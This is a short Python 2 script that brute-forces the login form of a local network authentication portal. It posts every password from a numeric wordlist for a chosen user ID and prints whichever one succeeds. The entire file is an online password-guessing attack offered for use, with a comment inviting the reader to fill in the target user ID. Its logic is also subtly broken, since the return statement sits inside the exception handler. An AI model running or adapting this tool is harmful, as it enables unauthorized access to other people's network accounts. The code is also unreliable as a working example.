# -*-coding:utf-8-*-

import urllib,httplib
from BeautifulSoup import BeautifulSoup
import re

url = '192.168.168.168'


def login(url,passw):
	print passw
    # fill in your userid
	postp= {'R6': 1, 'DDDDD': 'userid', 'upass': passw,'0MKKey': '%B5%C7%A1%A1%C2%BC'}
	params = urllib.urlencode(postp)
	headers = {"Content-type": "application/x-www-form-urlencoded"}
	conn = httplib.HTTPConnection(url)
	conn.request("POST",'/a30.htm',params,headers)
	res = conn.getresponse().read()
	conn.close()
	soup = BeautifulSoup(res)
	reg = r'''<!--     \t\t\r\nMsg=(.*?);time'''
	id = 0
	status = [False,False,True,True,True,False,False,False,False,False,False,False,False,False,False,True]
	try:
		id = int(re.findall(reg, soup.text, re.S)[0])
	except IndexError:
		id = 15
		return status[id]


pass_file = open('pwdNum6.txt','r')
for onePwd in pass_file.readlines():
	if login(url,onePwd):
		print 'success!'
		print 'password:'+onePwd
		break

